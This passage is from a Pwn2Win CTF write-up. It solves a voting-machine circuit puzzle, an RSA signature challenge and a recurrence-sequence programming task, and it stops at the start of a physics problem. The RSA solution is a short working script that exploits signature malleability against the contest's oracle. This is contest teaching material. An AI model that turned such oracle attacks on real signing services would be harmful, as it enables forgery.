+			manipulateResultPins((<span class="hljs-number">9</span>,+<span class="hljs-number">1</span>), (<span class="hljs-number">23</span>,-<span class="hljs-number">1</span>), (<span class="hljs-number">27</span>,+<span class="hljs-number">1</span>), (<span class="hljs-number">29</span>,-<span class="hljs-number">1</span>))
+			
+		... <span class="hljs-keyword">and</span> so on <span class="hljs-keyword">for</span> each <span class="hljs-string">"candidate?"</span>
+}
+</code></pre><p>Our idea to solve this would be based on the fact that each input/output has 8 bits. If we design a program that emulates the logic of the circuit, then feed the inputs and read the outputs we might have a solution.</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span>
+<span data-linenumber="19"></span>
+<span data-linenumber="20"></span>
+<span data-linenumber="21"></span>
+<span data-linenumber="22"></span>
+<span data-linenumber="23"></span>
+<span data-linenumber="24"></span>
+<span data-linenumber="25"></span>
+<span data-linenumber="26"></span>
+<span data-linenumber="27"></span>
+<span data-linenumber="28"></span>
+<span data-linenumber="29"></span>
+<span data-linenumber="30"></span>
+<span data-linenumber="31"></span>
+<span data-linenumber="32"></span>
+<span data-linenumber="33"></span>
+<span data-linenumber="34"></span>
+<span data-linenumber="35"></span>
+<span data-linenumber="36"></span>
+<span data-linenumber="37"></span>
+<span data-linenumber="38"></span>
+<span data-linenumber="39"></span>
+<span data-linenumber="40"></span>
+<span data-linenumber="41"></span>
+<span data-linenumber="42"></span>
+<span data-linenumber="43"></span>
+<span data-linenumber="44"></span>
+<span data-linenumber="45"></span>
+<span data-linenumber="46"></span>
+<span data-linenumber="47"></span>
+<span data-linenumber="48"></span>
+<span data-linenumber="49"></span>
+<span data-linenumber="50"></span>
+<span data-linenumber="51"></span>
+<span data-linenumber="52"></span>
+<span data-linenumber="53"></span>
+<span data-linenumber="54"></span>
+<span data-linenumber="55"></span>
+<span data-linenumber="56"></span>
+<span data-linenumber="57"></span>
+<span data-linenumber="58"></span>
+<span data-linenumber="59"></span>
+<span data-linenumber="60"></span>
+<span data-linenumber="61"></span>
+<span data-linenumber="62"></span>
+<span data-linenumber="63"></span>
+<span data-linenumber="64"></span>
+<span data-linenumber="65"></span>
+<span data-linenumber="66"></span>
+<span data-linenumber="67"></span>
+<span data-linenumber="68"></span>
+<span data-linenumber="69"></span>
+<span data-linenumber="70"></span>
+<span data-linenumber="71"></span>
+<span data-linenumber="72"></span>
+<span data-linenumber="73"></span>
+<span data-linenumber="74"></span>
+<span data-linenumber="75"></span>
+<span data-linenumber="76"></span>
+<span data-linenumber="77"></span>
+<span data-linenumber="78"></span>
+<span data-linenumber="79"></span>
+<span data-linenumber="80"></span>
+<span data-linenumber="81"></span>
+<span data-linenumber="82"></span>
+<span data-linenumber="83"></span>
+<span data-linenumber="84"></span>
+<span data-linenumber="85"></span>
+<span data-linenumber="86"></span>
+<span data-linenumber="87"></span>
+<span data-linenumber="88"></span>
+<span data-linenumber="89"></span>
+<span data-linenumber="90"></span>
+<span data-linenumber="91"></span>
+<span data-linenumber="92"></span>
+<span data-linenumber="93"></span>
+<span data-linenumber="94"></span>
+<span data-linenumber="95"></span>
+<span data-linenumber="96"></span>
+<span data-linenumber="97"></span>
+<span data-linenumber="98"></span>
+<span data-linenumber="99"></span>
+<span data-linenumber="100"></span>
+<span data-linenumber="101"></span>
+<span data-linenumber="102"></span>
+<span data-linenumber="103"></span>
+<span data-linenumber="104"></span>
+<span data-linenumber="105"></span>
+<span data-linenumber="106"></span>
+<span data-linenumber="107"></span>
+<span data-linenumber="108"></span>
+<span data-linenumber="109"></span>
+<span data-linenumber="110"></span>
+<span data-linenumber="111"></span>
+<span data-linenumber="112"></span>
+<span data-linenumber="113"></span>
+<span data-linenumber="114"></span>
+<span data-linenumber="115"></span></div><div class="code"><span class="hljs-comment">#!/usr/bin/python</span>
+
+<span class="hljs-comment"># result manipulation dictionary</span>
+<span class="hljs-comment"># -1 means this pins value is manipulated by -1</span>
+<span class="hljs-comment"># 0 means this pins value is not manipulated</span>
+<span class="hljs-comment"># 1 means this pins value is manipulated by +1</span>
+votestats = {
+    <span class="hljs-string">'pt'</span>: [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>], <span class="hljs-string">'pstu'</span>: [<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>],
+    <span class="hljs-string">'psc'</span>: [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>], <span class="hljs-string">'pcb'</span>: [<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
+    <span class="hljs-string">'psdc'</span>: [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>], <span class="hljs-string">'prtb'</span>: [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
+    <span class="hljs-string">'pco'</span>: [<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>], <span class="hljs-string">'psb'</span>: [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>],
+    <span class="hljs-string">'pv'</span>: [<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>], <span class="hljs-string">'psdb'</span>: [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
+    <span class="hljs-string">'psol'</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>]}
+
+<span class="hljs-comment"># candidates</span>
+possiblevotes = [<span class="hljs-string">'pt'</span>,<span class="hljs-string">'pstu'</span>,<span class="hljs-string">'psc'</span>,<span class="hljs-string">'pcb'</span>,<span class="hljs-string">'psdc'</span>,<span class="hljs-string">'prtb'</span>,<span class="hljs-string">'pco'</span>,<span class="hljs-string">'psb'</span>,<span class="hljs-string">'pv'</span>,<span class="hljs-string">'psdb'</span>,<span class="hljs-string">'psol'</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">notgate</span><span class="hljs-params">(input)</span>:</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> input
+
+<span class="hljs-keyword">for</span> vote <span class="hljs-keyword">in</span> possiblevotes:
+
+    <span class="hljs-comment"># Pin states - set them all to the most common state</span>
+    <span class="hljs-comment"># Pin names refer to the circuit diagram JPG</span>
+    pin = { <span class="hljs-number">2</span> : <span class="hljs-number">1</span>, <span class="hljs-number">3</span> : <span class="hljs-number">0</span>, <span class="hljs-number">4</span> : <span class="hljs-number">1</span>, <span class="hljs-number">5</span> : <span class="hljs-number">0</span>, <span class="hljs-number">6</span> : <span class="hljs-number">1</span>, <span class="hljs-number">7</span> : <span class="hljs-number">0</span>, <span class="hljs-number">8</span> : <span class="hljs-number">0</span>, <span class="hljs-number">22</span> : <span class="hljs-number">0</span>,
+        <span class="hljs-number">23</span> : <span class="hljs-number">0</span>, <span class="hljs-number">24</span> : <span class="hljs-number">1</span>, <span class="hljs-number">25</span> : <span class="hljs-number">0</span>, <span class="hljs-number">26</span> : <span class="hljs-number">0</span>, <span class="hljs-number">27</span> : <span class="hljs-number">0</span>, <span class="hljs-number">28</span> : <span class="hljs-number">1</span>}
+
+    <span class="hljs-comment"># store the outputs of the 7400 ics</span>
+    output = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">21</span>)]
+
+    <span class="hljs-comment"># the pin states are set based on keypad presses</span>
+    <span class="hljs-comment"># 2 keys are pressed, then the logic sets these states</span>
+    <span class="hljs-comment"># pt is default case so its not needed here</span>
+    <span class="hljs-keyword">if</span> vote == <span class="hljs-string">'pstu'</span>:
+        pin[<span class="hljs-number">24</span>] = <span class="hljs-number">0</span>
+        pin[<span class="hljs-number">28</span>] = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">elif</span> vote == <span class="hljs-string">'psc'</span>:
+        pin[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span> 
+        pin[<span class="hljs-number">22</span>] = <span class="hljs-number">1</span>
+        pin[<span class="hljs-number">24</span>] = <span class="hljs-number">0</span>
+        pin[<span class="hljs-number">26</span>] = <span class="hljs-number">1</span>
+        pin[<span class="hljs-number">28</span>] = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">elif</span> vote == <span class="hljs-string">'pcb'</span>:
+        pin[<span class="hljs-number">22</span>] = <span class="hljs-number">1</span>
+        pin[<span class="hljs-number">26</span>] = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">elif</span> vote == <span class="hljs-string">'psdc'</span>:
+        pin[<span class="hljs-number">22</span>] = <span class="hljs-number">1</span>
+        pin[<span class="hljs-number">28</span>] = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">elif</span> vote == <span class="hljs-string">'prtb'</span>:
+        pin[<span class="hljs-number">8</span>] = <span class="hljs-number">1</span>
+        pin[<span class="hljs-number">26</span>] = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">elif</span> vote == <span class="hljs-string">'pco'</span>:
+        pin[<span class="hljs-number">26</span>] = <span class="hljs-number">1</span>
+        pin[<span class="hljs-number">28</span>] = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">elif</span> vote == <span class="hljs-string">'psb'</span>:
+        pin[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">elif</span> vote == <span class="hljs-string">'pv'</span>:
+        pin[<span class="hljs-number">28</span>] = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">elif</span> vote == <span class="hljs-string">'psdb'</span>:
+        pin[<span class="hljs-number">8</span>] = <span class="hljs-number">1</span>
+        pin[<span class="hljs-number">24</span>] = <span class="hljs-number">0</span>
+        pin[<span class="hljs-number">26</span>] = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">elif</span> vote == <span class="hljs-string">'psol'</span>:
+        pin[<span class="hljs-number">8</span>] = <span class="hljs-number">1</span>
+        pin[<span class="hljs-number">26</span>] = <span class="hljs-number">1</span>
+        pin[<span class="hljs-number">28</span>] = <span class="hljs-number">0</span>
+
+
+    <span class="hljs-comment"># compute the logic as a series of logic operations to</span>
+    <span class="hljs-comment"># simulate the 20 x 7400 series logic chips in the circuit</span>
+    output[<span class="hljs-number">1</span>] = pin[<span class="hljs-number">2</span>]
+    output[<span class="hljs-number">2</span>] = <span class="hljs-keyword">not</span>(<span class="hljs-keyword">not</span>(output[<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> output[<span class="hljs-number">1</span>]) <span class="hljs-keyword">and</span> output[<span class="hljs-number">1</span>])
+    output[<span class="hljs-number">3</span>] = <span class="hljs-keyword">not</span> output[<span class="hljs-number">2</span>]
+    output[<span class="hljs-number">4</span>] = <span class="hljs-keyword">not</span>(<span class="hljs-keyword">not</span>(output[<span class="hljs-number">3</span>] <span class="hljs-keyword">and</span> output[<span class="hljs-number">3</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span>(output[<span class="hljs-number">3</span>] <span class="hljs-keyword">and</span> output[<span class="hljs-number">3</span>])) 
+    pin[<span class="hljs-number">3</span>] = int(output[<span class="hljs-number">4</span>]) 
+
+    output[<span class="hljs-number">5</span>] = <span class="hljs-keyword">not</span>(output[<span class="hljs-number">4</span>] <span class="hljs-keyword">or</span> pin[<span class="hljs-number">4</span>])
+    output[<span class="hljs-number">6</span>] = <span class="hljs-keyword">not</span>(<span class="hljs-keyword">not</span>(output[<span class="hljs-number">5</span>] <span class="hljs-keyword">and</span> output[<span class="hljs-number">5</span>]) <span class="hljs-keyword">and</span> output[<span class="hljs-number">5</span>])
+    output[<span class="hljs-number">7</span>] = <span class="hljs-keyword">not</span>(<span class="hljs-keyword">not</span>(output[<span class="hljs-number">6</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span>(output[<span class="hljs-number">6</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>))
+    output[<span class="hljs-number">8</span>] = (output[<span class="hljs-number">7</span>] <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span> 
+    pin[<span class="hljs-number">5</span>] = int(output[<span class="hljs-number">8</span>]) 
+
+    output[<span class="hljs-number">10</span>] = <span class="hljs-keyword">not</span>(<span class="hljs-keyword">not</span>(<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> pin[<span class="hljs-number">6</span>]) <span class="hljs-keyword">or</span> pin[<span class="hljs-number">6</span>])
+    output[<span class="hljs-number">12</span>] = <span class="hljs-keyword">not</span>(pin[<span class="hljs-number">8</span>] <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span>(pin[<span class="hljs-number">8</span>])) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span> 
+    <span class="hljs-comment"># for this pin, sometimes we manipulate it :)</span>
+    pin[<span class="hljs-number">9</span>] = int(output[<span class="hljs-number">12</span>]) + votestats[vote][<span class="hljs-number">0</span>]
+
+    output[<span class="hljs-number">13</span>] = <span class="hljs-keyword">not</span>(<span class="hljs-keyword">not</span>(pin[<span class="hljs-number">22</span>] <span class="hljs-keyword">and</span> output[<span class="hljs-number">12</span>]) <span class="hljs-keyword">and</span> <span class="hljs-number">0</span>)
+    output[<span class="hljs-number">14</span>] = (output[<span class="hljs-number">13</span>] <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span> 
+    <span class="hljs-comment"># for this pin, sometimes we manipulate it :)</span>
+    pin[<span class="hljs-number">23</span>] = int(output[<span class="hljs-number">14</span>]) + votestats[vote][<span class="hljs-number">1</span>]
+
+    output[<span class="hljs-number">15</span>] = (pin[<span class="hljs-number">24</span>] <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span> 
+    pin[<span class="hljs-number">25</span>] = int(output[<span class="hljs-number">15</span>]) 
+
+    output[<span class="hljs-number">16</span>] = <span class="hljs-keyword">not</span>(<span class="hljs-keyword">not</span>(pin[<span class="hljs-number">26</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">0</span>)
+    output[<span class="hljs-number">17</span>] = <span class="hljs-keyword">not</span>(output[<span class="hljs-number">16</span>] <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>) 
+    <span class="hljs-comment"># for this pin, sometimes we manipulate it :)</span>
+    pin[<span class="hljs-number">27</span>] = int(output[<span class="hljs-number">17</span>]) + votestats[vote][<span class="hljs-number">2</span>]
+
+    output[<span class="hljs-number">18</span>] = <span class="hljs-keyword">not</span> pin[<span class="hljs-number">28</span>]
+    output[<span class="hljs-number">19</span>] = <span class="hljs-keyword">not</span>(<span class="hljs-keyword">not</span>(output[<span class="hljs-number">18</span>] <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
+    output[<span class="hljs-number">20</span>] = <span class="hljs-keyword">not</span>(output[<span class="hljs-number">19</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">0</span>) 
+    <span class="hljs-comment"># for this pin, sometimes we manipulate it :)</span>
+    pin[<span class="hljs-number">29</span>] = int(output[<span class="hljs-number">20</span>]) + votestats[vote][<span class="hljs-number">3</span>]
+
+    output = map(int, output)
+    letter = <span class="hljs-string">""</span>
+    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pin.keys():
+        <span class="hljs-keyword">if</span> p % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:
+            letter += str(pin[p])
+
+    <span class="hljs-keyword">print</span> chr(int(letter,<span class="hljs-number">2</span>)),
+
+<span class="hljs-keyword">print</span>
+</div></div></code></pre><p>flag: <code>CTF-BR{FRAUDETOTAL}</code></p><h3 id="rsa-signature-crypto-200">RSA Signature - Crypto 200<a class="header-link hidden-xs" href="#rsa-signature-crypto-200" title="rsa-signature-crypto-200"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>Solution: <code>Verify(Sign(2), 2)</code></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span></div><div class="code"><span class="hljs-keyword">from</span> scryptos <span class="hljs-keyword">import</span> *
+
+m = int(<span class="hljs-string">"Implementing RSA based signature is so difficult to be broken"</span>.encode(<span class="hljs-string">"hex"</span>), <span class="hljs-number">16</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span><span class="hljs-params">(x, y)</span>:</span>
+  p = Tube(host=<span class="hljs-string">"rsign.pwn2win.party"</span>, port=<span class="hljs-number">31229</span>)
+  p.read_until(<span class="hljs-string">";"</span>)
+  p.write(<span class="hljs-string">"%s:%s;"</span> % (format(x, <span class="hljs-string">"b"</span>), format(y, <span class="hljs-string">"b"</span>)))
+  <span class="hljs-keyword">return</span> p.read(<span class="hljs-number">1024</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sign</span><span class="hljs-params">(x)</span>:</span>
+  p1 = Tube(host=<span class="hljs-string">"rsign.pwn2win.party"</span>, port=<span class="hljs-number">31228</span>)
+  p1.read_until(<span class="hljs-string">";"</span>)
+  p1.write(<span class="hljs-string">"%s;"</span> % format(x, <span class="hljs-string">"b"</span>))
+  <span class="hljs-keyword">return</span> int(p1.read(<span class="hljs-number">1024</span>), <span class="hljs-number">2</span>)
+
+sig = sign(<span class="hljs-number">2</span>)
+<span class="hljs-keyword">print</span> verify(<span class="hljs-number">2</span>, sig)
+</div></div></code></pre><p>umm, Challenge was buggy? well, I got flag haha</p><p>Flag is <code>CTF-BR{malle4bitly_is_a_property_so_be4utiful_and_d4ngerous}</code></p><h3 id="death-sequence-ppc-100">Death Sequence - PPC 100<a class="header-link hidden-xs" href="#death-sequence-ppc-100" title="death-sequence-ppc-100"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><pre><code class="ruby hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span>
+<span data-linenumber="19"></span>
+<span data-linenumber="20"></span>
+<span data-linenumber="21"></span>
+<span data-linenumber="22"></span>
+<span data-linenumber="23"></span>
+<span data-linenumber="24"></span>
+<span data-linenumber="25"></span>
+<span data-linenumber="26"></span>
+<span data-linenumber="27"></span>
+<span data-linenumber="28"></span>
+<span data-linenumber="29"></span>
+<span data-linenumber="30"></span>
+<span data-linenumber="31"></span>
+<span data-linenumber="32"></span>
+<span data-linenumber="33"></span>
+<span data-linenumber="34"></span>
+<span data-linenumber="35"></span>
+<span data-linenumber="36"></span>
+<span data-linenumber="37"></span>
+<span data-linenumber="38"></span>
+<span data-linenumber="39"></span>
+<span data-linenumber="40"></span>
+<span data-linenumber="41"></span>
+<span data-linenumber="42"></span>
+<span data-linenumber="43"></span>
+<span data-linenumber="44"></span>
+<span data-linenumber="45"></span>
+<span data-linenumber="46"></span>
+<span data-linenumber="47"></span>
+<span data-linenumber="48"></span>
+<span data-linenumber="49"></span>
+<span data-linenumber="50"></span>
+<span data-linenumber="51"></span>
+<span data-linenumber="52"></span>
+<span data-linenumber="53"></span>
+<span data-linenumber="54"></span>
+<span data-linenumber="55"></span>
+<span data-linenumber="56"></span>
+<span data-linenumber="57"></span>
+<span data-linenumber="58"></span>
+<span data-linenumber="59"></span>
+<span data-linenumber="60"></span>
+<span data-linenumber="61"></span>
+<span data-linenumber="62"></span>
+<span data-linenumber="63"></span>
+<span data-linenumber="64"></span>
+<span data-linenumber="65"></span>
+<span data-linenumber="66"></span>
+<span data-linenumber="67"></span>
+<span data-linenumber="68"></span>
+<span data-linenumber="69"></span>
+<span data-linenumber="70"></span>
+<span data-linenumber="71"></span>
+<span data-linenumber="72"></span>
+<span data-linenumber="73"></span>
+<span data-linenumber="74"></span></div><div class="code"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment">#coding:ascii-8bit</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">"matrix"</span>
+require_relative <span class="hljs-string">"../../pwnlib"</span>  <span class="hljs-comment"># https://github.com/Charo-IT/pwnlib</span>
+
+<span class="hljs-comment"># run commands below before running this script</span>
+<span class="hljs-comment"># $ echo '#!/bin/bash' &gt; script.sh</span>
+<span class="hljs-comment"># $ echo 'openssl s_client -connect programming.pwn2win.party:9001' &gt;&gt; script.sh</span>
+<span class="hljs-comment"># $ chmod +x script.sh</span>
+<span class="hljs-comment"># $ socat tcp-listen:54321,fork,reuseaddr exec:./script.sh</span>
+
+<span class="hljs-constant">MOD</span> = <span class="hljs-number">10</span> ** <span class="hljs-number">20</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> </span>mod(a, m)
+    n = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>...a.row_size
+        n &lt;&lt; []
+        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>...a.row_size
+            <span class="hljs-keyword">if</span> a[i, j] &gt;= <span class="hljs-number">0</span>
+                n[-<span class="hljs-number">1</span>] &lt;&lt; a[i, j] % <span class="hljs-constant">MOD</span>
+            <span class="hljs-keyword">else</span>
+                n[-<span class="hljs-number">1</span>] &lt;&lt; a[i, j] % <span class="hljs-constant">MOD</span>
+            <span class="hljs-keyword">end</span>
+        <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">end</span>
+    <span class="hljs-constant">Matrix</span>.rows(n)
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> </span>pow(a, n)
+    b = <span class="hljs-constant">Matrix</span>.<span class="hljs-constant">I</span>(a.row_size)
+    <span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>
+        <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>
+            b = mod(b * a, <span class="hljs-constant">MOD</span>)
+        <span class="hljs-keyword">end</span>
+        a = mod(a * a, <span class="hljs-constant">MOD</span>)
+        n <span class="hljs-prompt">&gt;&gt;= </span><span class="hljs-number">1</span>
+    <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">return</span> b
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> </span>get_nth_number(n)
+	<span class="hljs-comment"># A_n = 4*A_{n-1} + 3*A_{n-2} + 2*A_{n-3} + 1*A_{n-4}</span>
+    v = <span class="hljs-constant">Vector</span>[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]
+    a = <span class="hljs-constant">Matrix</span>.rows([[<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]])
+
+    (pow(a, n) * v)[-<span class="hljs-number">1</span>]
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> </span>get_nth_sum(n)
+	<span class="hljs-comment"># S_n = 5*S_{n-1} - S_{n-2} - S_{n-3} - S_{n-4} - S_{n-5}</span>
+    v = <span class="hljs-constant">Vector</span>[<span class="hljs-number">14</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]
+    a = <span class="hljs-constant">Matrix</span>.rows([[<span class="hljs-number">5</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]])
+
+    (pow(a, n) * v)[-<span class="hljs-number">1</span>]
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-constant">PwnTube</span>.open(<span class="hljs-string">"localhost"</span>, <span class="hljs-number">54321</span>){|tube|
+    tube.recv_until(<span class="hljs-string">"certificate)\n---\n"</span>)
+
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">true</span>
+        s = tube.recv_until(<span class="hljs-string">"\n"</span>)
+        <span class="hljs-keyword">if</span> s.<span class="hljs-keyword">include</span>?(<span class="hljs-string">"CTF-BR{"</span>)
+            puts s
+            <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">end</span>
+        n = s.to_i
+
+        puts <span class="hljs-string">"n = <span class="hljs-subst">#{n}</span>"</span>
+        nth = get_nth_number(n - <span class="hljs-number">1</span>).to_s[-<span class="hljs-number">9</span>..-<span class="hljs-number">1</span>]
+        sum = get_nth_sum(n - <span class="hljs-number">1</span>).to_s[-<span class="hljs-number">9</span>..-<span class="hljs-number">1</span>]
+        puts <span class="hljs-string">"nth = <span class="hljs-subst">#{nth}</span>  sum = <span class="hljs-subst">#{sum}</span>"</span>
+        tube.sendline(<span class="hljs-string">"<span class="hljs-subst">#{nth}</span> <span class="hljs-subst">#{sum}</span>"</span>)
+    <span class="hljs-keyword">end</span>
+}
+</div></div></code></pre><p>flag: <code>CTF-BR{It-wAs-jUsT-a-ReCURsIVe-SequenCE-to-BE-coded-In-LOGN-XwmIBVyZ5QEC}</code></p><h3 id="drone-fail-phy-40">Drone Fail - phy 40<a class="header-link hidden-xs" href="#drone-fail-phy-40" title="drone-fail-phy-40"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>First, we calculate gravitational acceleration <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-4-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>g</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-51" role="math" style="width: 0.628em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.523em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.93em 1000.47em 2.867em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-52"><span class="mi" id="MathJax-Span-53" style="font-family: STIXGeneral-Italic;">g</span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.309em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 0.878em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>g</mi></math></span></span><script type="math/tex" id="MathJax-Element-4">g</script></span> with</p><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><div class="MathJax_Display" style="text-align: center;"><span class="MathJax" id="MathJax-Element-5-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot; display=&quot;block&quot;><mi>g</mi><mo>=</mo><mfrac><mrow><mi>G</mi><mi>M</mi></mrow><mrow><mo stretchy=&quot;false&quot;>(</mo><mn>1000</mn><mi>R</mi><msup><mo 